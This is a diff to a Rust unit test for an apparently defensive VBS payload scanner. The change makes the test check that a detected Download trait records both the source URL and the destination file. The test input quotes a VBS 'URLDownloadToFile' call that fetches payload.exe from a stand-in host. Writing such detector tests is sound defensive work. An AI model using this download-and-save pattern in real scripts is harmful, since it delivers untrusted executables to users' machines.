@@ -10316,12 +10316,14 @@ URLDownloadToFile 0, u, "payload.exe", 0, 0"#;
         crate::vbs_scan::scan_vbs_payloads(&mut env);
         let has = env.traits.iter().any(|t| {
             matches!(t,
-                Trait::Download { src, .. } if src == "http://vbs-urldown-var.example/payload.exe"
+                Trait::Download { src, dst, .. }
+                    if src == "http://vbs-urldown-var.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
             )
         });
         assert!(
             has,
-            "no Download trait from VBS URLDownloadToFile variable URL: {:?}",
+            "no Download trait with destination from VBS URLDownloadToFile variable URL: {:?}",
             env.traits
         );
     }
